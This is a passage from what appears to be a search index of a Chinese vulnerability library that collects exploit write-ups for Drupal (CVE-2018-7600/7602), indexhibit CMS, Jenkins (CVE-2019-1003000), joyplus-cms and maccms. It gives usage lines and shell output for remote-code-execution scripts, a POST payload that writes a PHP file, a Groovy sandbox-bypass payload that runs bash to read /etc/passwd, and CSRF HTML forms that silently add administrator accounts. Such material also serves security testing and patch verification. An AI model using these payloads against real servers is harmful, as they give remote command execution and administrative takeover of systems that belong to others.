%B4%9E%28CVE-2017-6920%29/#vulnerability-list","title":"Vulnerability list","text":"<p>cve-2018-7600_cmd.py Drupal Drupalgeddon 2 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c[\u4f7f\u7528] cve-2018-7600_poc.py \u8be5\u811a\u672c\u53ef\u68c0\u6d4b CVE-2018-7602 \u548c CVE-2018-7600  cve-2018-7602_cmd.py Drupal \u5185\u6838\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c(\u9700\u8981\u8d26\u6237\u5bc6\u7801)  cve-2018-7602_poc.py \u8be5\u811a\u672c\u53ef\u68c0\u6d4b CVE-2018-7602 \u548c CVE-2018-7600 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/drupal/Drupal%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2017-6920%29/#readme","title":"Readme","text":"<p>\u90e8\u5206\u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u8be6\u7ec6\u4f7f\u7528\u5206\u6790\u8bf7\u53c2\u8003vulnerability-list\u4e2d\u7684[\u4f7f\u7528] - VER: \u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e0d\u5728\u5f71\u54cd\u8303\u56f4\u7684\u7248\u672c\u6ca1\u6709\u76f8\u5173\u6f0f\u6d1e - USE: \u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u5927\u90e8\u5206\u5199\u5728\u4e86\u811a\u672c\u91cc\uff0c\u6267\u884c\u5373\u53ef\u89c1 - EXP: \u811a\u672c\u5229\u7528\u793a\u4f8b\uff0c\u4ee5\u53ca\u6267\u884c\u6548\u679c - DES: \u90e8\u5206\u7279\u6b8a\u811a\u672c\u6587\u4ef6\u7684\u7279\u6b8a\u63cf\u8ff0</p> <p>\u811a\u672c\u5185\u5bb9\u5728github\u83b7\u53d6</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/drupal/Drupal%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2017-6920%29/#cve-2018-7600_cmdpy-drupal-drupalgeddon-2","title":"CVE-2018-7600_cmd.py Drupal Drupalgeddon 2 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c","text":"<p>USE: <pre><code>+----------------------------------------------------------------------+\n+ DES: by zhzyker as https://github.com/zhzyker/exphub                 +\n+      Drupal Drupalgeddon 2 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c CVE-2018-7600                +\n+----------------------------------------------------------------------+\n+ USE: python3 &lt;filename&gt; &lt;url&gt;                                        +\n+ EXP: python3 cve-2018-7600_cmd.py http://1.1.1.1:8080                +\n+ VER: Drupal 6.x                                                      +\n+      Drupal 7.x &lt; 7.58                                               +\n+      Drupal 8.3 &lt; 8.3.9                                              +\n+      Drupal 8.4 &lt; 8.4.6                                              +\n+      Drupal 8.5 &lt; 8.5.1                                              +\n+----------------------------------------------------------------------+\n+ DES: Shell\u4ec5\u80fd\u56de\u663e\u4e00\u884c\u4ee3\u7801\uff0c\u591a\u884c\u4ee3\u7801\u7ed3\u679c\u67e5\u770bhttp://xxxx/exphub.txt   +\n+----------------------------------------------------------------------+\n</code></pre> EXP: <pre><code>zhzy@debian:$ python3 cve-2018-7600_cmd.py http://freeerror.org:8080\n[+] http://freeerror.org:8080/exphub.txt\n\nShell &gt;&gt;&gt; id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nShell &gt;&gt;&gt; whoami\nwww-data\nShell &gt;&gt;&gt; exit\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/drupal/Drupal%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2017-6920%29/#cve-2018-7600_pocpy-cve-2018-7602-cve-2018-7600","title":"CVE-2018-7600_poc.py \u8be5\u811a\u672c\u53ef\u68c0\u6d4b CVE-2018-7602 \u548c CVE-2018-7600","text":"<p>EXP: <pre><code>zhzy@debian:$ python3 cve-2018-7600_poc.py http://freeerror.org:8081\n\n+------------------------------------------------------------------+\n+                           iDrupal                                +\n+                          by IAmG0d                               +\n+------------------------------------------------------------------+\n+ USE: python3 &lt;filename&gt; &lt;url&gt;                                    +\n+ EXP: python3 cve-2018-7602_poc.py http://freeerror.org:8081      +\n+------------------------------------------------------------------+\n+ DES: \u8be5\u811a\u672c\u53ef\u68c0\u6d4b CVE-2018-7602 \u548c CVE-2018-7600                 +\n+------------------------------------------------------------------+\n\n[~] Checking the version of http://freeerror.org:8081/\n[+] Possibly vulnerable to CVE-2018-7600!\n[+] Possibly vulnerable to CVE-2018-7602!\n[0:)] Thank You For Using... Goodbye\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/drupal/Drupal%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2017-6920%29/#cve-2018-7602_cmdpy-drupal","title":"CVE-2018-7602_cmd.py Drupal \u5185\u6838\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c(\u9700\u8981\u8d26\u6237\u5bc6\u7801)","text":"<p>EXP: <pre><code>zhzy@debian:/debian/archives-tool/web-drupal$ python cve-2018-7602_cmd.py admin admin http://freeerror.org:8080 -c id\n()\n+---------------------------------------------------------------------------------+\n+   DRUPAL 7 &lt;= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602)     +\n+                                   by pimps                                      +\n+---------------------------------------------------------------------------------+\n+ USE: python3 &lt;filename&gt; &lt;username&gt; &lt;password&gt; &lt;url&gt; -c &lt;command&gt;                +\n+ EXP: python3 cve-2018-7602_cmd.py admin admin http://1.1.1.1:8080 -c \"id\"       +\n+ VER: Drupal 7.x &lt; 7.59                                                          +\n+      Drupal 8.4 &lt; 8.4.8                                                         +\n+      Drupal 8.5 &lt; 8.5.3                                                         +\n+---------------------------------------------------------------------------------+\n+ DES: CVE-2018-7602 Need Username Password                                       +\n+---------------------------------------------------------------------------------+\n\n[*] Creating a session using the provided credential...\n[*] Finding User ID...\n[*] User ID found: /user/1\n[*] Poisoning a form using 'destination' and including it in cache.\n[*] Poisoned form ID: form-6iAq8Ou5pKFQqEZ4sh1A_zQI_5QMSC71Stp4ohaseW0\n[*] Triggering exploit to execute: id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/","title":"CVE 2019 16314 indexhibit cms v2.1.5 \u5b58\u5728\u91cd\u88c5\u5e76\u5bfc\u81f4getshell","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#_1","title":"\u524d\u8a00","text":"<p>CVE-2019-16314 indexhibit cms v2.1.5 \u5b58\u5728\u91cd\u88c5\u5e76\u5bfc\u81f4getshell</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#_2","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>\u591c\u7a0b \u53d1\u73b0indexhibit cms v2.1.5 \u5b58\u5728\u91cd\u88c5\u5e76\u5bfc\u81f4getshell \u6f0f\u6d1e</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#_3","title":"\u6f0f\u6d1e\u5371\u5bb3","text":"<p>\u5982\u679c\u6ca1\u6709\u5220\u9664 install.php \u5219\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u63d0\u4ea4\u53c2\u6570\u8fdb\u884c\u91cd\u88c5\uff0c\u5e76\u5728\u540e\u53f0\u76f4\u63a5getshell</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#_4","title":"\u5f71\u54cd\u8303\u56f4","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#_5","title":"\u4ea7\u54c1","text":"<p>indexhibit cms</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#_6","title":"\u7248\u672c","text":"<p>indexhibit cms  v2.1.5 \u7248\u672c  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#_7","title":"\u7ec4\u4ef6","text":"<p>indexhibit cms  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#_8","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u76f4\u63a5\u8bbf\u95ee/ndxzstudio/install.php\uff0c\u63d0\u793a\u5df2\u5b89\u88c5</p> <p>\u4f46\u662f\uff0c\u901a\u8fc7\u53c2\u6570p\u53ef\u4ee5\u7ed5\u8fc7\uff0c\u76f4\u63a5\u91cd\u65b0\u5b89\u88c5</p> <p>\u586b\u5199\u76f8\u5173\u4fe1\u606f\u540e\u5b89\u88c5\u6210\u529f\uff1a</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#poc","title":"POC\uff1a","text":"<p>/ndxzstudio/install.php?p=2</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/indexhibit%20cms%20v2.1.5%20%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%BE%91php%E6%96%87%E4%BB%B6getshell/","title":"Indexhibit cms v2.1.5 \u76f4\u63a5\u7f16\u8f91php\u6587\u4ef6getshell","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/indexhibit%20cms%20v2.1.5%20%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%BE%91php%E6%96%87%E4%BB%B6getshell/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 indexhibit cms v2.1.5 \u76f4\u63a5\u7f16\u8f91php\u6587\u4ef6getshell 2019-02-20 yc\uff083365487579@qq.com\uff09 https://www.indexhibit.org/ https://www.indexhibit.org/ v2.1.5 CVE-2019-8954"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/indexhibit%20cms%20v2.1.5%20%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%BE%91php%E6%96%87%E4%BB%B6getshell/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>indexhibit CMS 2.1.5\u7248\u672c\u5b58\u5728\u4e00\u4e2a\u76f4\u63a5\u7f16\u8f91php\u6587\u4ef6\u7684\u6f0f\u6d1e\uff0c\u5bfc\u81f4getshell\u3002   </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/indexhibit%20cms%20v2.1.5%20%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%BE%91php%E6%96%87%E4%BB%B6getshell/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>\u5f53\u6211\u4eec\u767b\u5f55\u8fdb\u540e\u53f0\u540e\uff0c\u5411/ndxzstudio/?a=system post\u6570\u636e\uff1a</p> <pre><code>upd_jxcode=true&amp;v=%253C%253Fphp%2520phpinfo()%253B%253F%253E&amp;id=%2Fcss%2Faudio.php\n</code></pre> <p>\u5373\u53ef\u5728/css/\u76ee\u5f55\u5199\u5165\u4e00\u4e2aphp\u6587\u4ef6audio.php\u3002  </p> <p>\u6210\u529fgetshell\uff1a</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/jenkins/cve-2019-1003000-jenkins%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","title":"PoC: Jenkins RCE","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/jenkins/cve-2019-1003000-jenkins%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#security-1266-cve-2019-1003000-script-security-cve-2019-1003001-pipeline-groovy-cve-2019-1003002-pipeline-declarative","title":"SECURITY-1266 / CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)","text":"<p>A proof of concept to allow users with Overall/Read permission and Job/Configure (and optional Job/Build) to bypass the sandbox protection and execute arbitrary code on the Jenkins master or node.</p> <p>Update: An article by Orange Tsai explaining the exploit chain utilizing CVE-2018-1000861 and CVE-2019-1003000 that bypass the need of Overall/Read permission for a pre-auth RCE: http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html</p> <p>\u5177\u4f53\u6587\u4ef6\u89c1github</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/jenkins/cve-2019-1003000-jenkins%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#installation","title":"Installation","text":"<pre><code>$ git clone https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git\n$ cd cve-2019-1003000-jenkins-rce-poc\n$ pip install -r requirements.txt\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/jenkins/cve-2019-1003000-jenkins%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#usage","title":"Usage","text":"<p>Pass target url, job name, username/password credential, and system command to be executed, as arguments. <pre><code>$ python exploit.py --url http://jenkins-site.com --job job_name --username your_user --password your_passwd --cmd \"cat /etc/passwd\"\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/jenkins/cve-2019-1003000-jenkins%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#explanation","title":"Explanation","text":"<p>Quoted from Red Hat Bugzilla - Bug 1667566:</p> <p>A flaw was found in Pipeline: Declarative Plugin before version 1.3.4.1, Pipeline: Groovy Plugin before version 2.61.1 and Script Security Plugin before version 1.50. Script Security sandbox protection could be circumvented during the script compilation phase by applying AST transforming annotations such as @Grab to source code elements. Both the pipeline validation REST APIs and actual script/pipeline execution are affected. This allowed users with Overall/Read permission, or able to control Jenkinsfile or sandboxed Pipeline shared library contents in SCM, to bypass the sandbox protection and execute arbitrary code on the Jenkins master or node. All known unsafe AST transformations in Groovy are now prohibited in sandboxed scripts.</p> <p>This PoC is using a user with Overall/Read and Job/Configure permission to execute a maliciously modified build script in sandbox mode, and try to bypass the sandbox mode limitation in order to run arbitraty scripts (in this case, we will execute system command).</p> <p>As a background, Jenkins's pipeline build script is written in groovy. This build script will be compiled and executed in Jenkins master or node, containing definition of the pipeline, e.g. what to do in slave nodes. Jenkins also provide the script to be executed in sandbox mode. In sandbox mode, all dangerous functions are blacklisted, so regular user cannot do anything malicious to the Jenkins server.</p> <p>However, because the build script is written in Groovy, we can use any class or function in Java packages (However in sandbox mode, dangerous built-in ones are blacklisted). In this case, we are using AST transforming annotations <code>@Grab</code> to make jenkins import arbitrary java packages from external maven repository. In this PoC, I use <code>ProcBuilder</code> class defined in <code>org.buildobjects:jproc:2.2.3</code> in order to run system shell command.</p> <p>The payload is defined as below: <pre><code>import org.buildobjects.process.ProcBuilder\n@Grab('org.buildobjects:jproc:2.2.3')\nclass Dummy{ }\nprint new ProcBuilder(\"/bin/bash\").withArgs(\"-c\",\"cat /etc/passwd\").run().getOutputString()\n</code></pre></p> <p>The script above will be compiled and executed in Jenkins master or node. After the job build is done, we can see the result of the shell command <code>cat /etc/passwd</code> in the job console output. Moreover, we can utilize this RCE to gain reverse shell, and literally pwn the Jenkins server!</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/jenkins/cve-2019-1003000-jenkins%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#example-vulnerable-site","title":"Example Vulnerable Site","text":"<p>An example vulnerable jenkins is provided in this repository at directory <code>sample-vuln</code> in Docker container format. After booting up, the container image will have a jenkins site hosted on port tcp/8080, with a regular user with Overall/Read + Job/Configure + Job/Build permission with credential <code>user1:user1</code>, and pipeline job with id <code>my-pipeline</code>.</p> <pre><code>$ cd sample-vuln\n$ ./run.sh\n\n\n$ cd ..\n$ python exploit.py --url http://localhost:8080 --job my-pipeline --username user1 --password user1 --cmd \"cat /etc/passwd\"\n\n[+] connecting to jenkins...\n[+] crafting payload...\n[+] modifying job with payload...\n[+] putting job build to queue...\n[+] waiting for job to build...\n[+] restoring job...\n[+] fetching output...\n[+] OUTPUT:\nStarted by user User 1\nRunning in Durability level: MAX_SURVIVABILITY\n[Pipeline] echo\nroot:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/bin/sh\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\npostgres:x:70:70::/var/lib/postgresql:/bin/sh\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\njenkins:x:1000:1000:Linux User,,,:/var/jenkins_home:/bin/bash\n\n[Pipeline] End of Pipeline\nFinished: SUCCESS\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/jenkins/cve-2019-1003000-jenkins%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#reference","title":"Reference","text":"<ul> <li>Jenkins Security Advisory 2019-01-08</li> <li>Jenkins upstream patch</li> <li>Red Hat Bugzilla - Bug 1667566</li> <li>Jenkins Script Security Plugin</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/joyplusCMS/joyplus-cms%201.6.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/","title":"joyplus cms 1.6.0\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/joyplusCMS/joyplus-cms%201.6.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 joyplus-cms 1.6.0\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237 2018-03-14 yx\uff08yx@5ecurity.cn\uff09 https://github.com/joyplus/joyplus-cms/ https://github.com/joyplus/joyplus-cms/ 1.6.0 CVE-2018-8717"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/joyplusCMS/joyplus-cms%201.6.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>joyplus-cms 1.6.0\u5b58\u5728CSRF\u6f0f\u6d1e\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\u8bbf\u95ee\u4e0b\u9762CSRF\u6d4b\u8bd5\u9875\u9762\u53ef\u5c06\u666e\u901a\u7528\u6237\u63d0\u6210\u4e3a\u7ba1\u7406\u5458\u6743\u9650\u3002joyplus-cms\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684CMS\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7issues\u544a\u77e5\u4f5c\u8005\u3002  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/joyplusCMS/joyplus-cms%201.6.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>CSRF\u6d4b\u8bd5\u9875\u9762\u4ee3\u7801\u5982\u4e0b\uff1a <pre><code>&lt;html&gt;\n  &lt;body&gt;\n  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;\n    &lt;form action=\"http://192.168.126.129/joyplus-cms-master/joyplus-cms/manager/admin_ajax.php?action=save&amp;tab={pre}manager\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"m&amp;#95;id\" value=\"\" /&gt;\n      &lt;input type=\"hidden\" name=\"flag\" value=\"add\" /&gt;\n      &lt;input type=\"hidden\" name=\"m&amp;#95;name\" value=\"admin1\" /&gt;\n      &lt;input type=\"hidden\" name=\"m&amp;#95;password\" value=\"admin1\" /&gt;\n      &lt;input type=\"hidden\" name=\"m&amp;#95;status\" value=\"1\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/macCMS/maccms_v10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7/","title":"maccms v10\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u4efb\u610f\u8d26\u53f7","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/macCMS/maccms_v10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 maccms_v10\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u4efb\u610f\u8d26\u53f7 2018-06-11 Bay0net http://www.maccms.com/ http://www.maccms.com/down.html v10 CVE-2018-12114"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/macCMS/maccms_v10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>\u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u7cbe\u5fc3\u4f2a\u9020\u4e00\u4e2aHtml\u9875\u9762\u6dfb\u52a0\u7ba1\u7406\u5458\u8d26\u6237\u5bf9\u7f51\u7ad9\u8fdb\u884c\u5165\u4fb5\u3002   </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/macCMS/maccms_v10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>exp\u4ee3\u7801\u5982\u4e0b\uff1a  </p> <pre><code>&lt;html&gt;\n  &lt;body&gt;\n  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;\n    &lt;form action=\"http://10.211.55.17/maccms10/admin.php/admin/admin/info.html\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"admin_id\" value=\"\" /&gt;\n      &lt;input type=\"hidden\" name=\"admin_name\" value=\"test2\" /&gt;\n      &lt;input type=\"hidden\" name=\"admin_pwd\" value=\"test2\" /&gt;\n      &lt;input type=\"hidden\" name=\"admin_status\" value=\"1\" 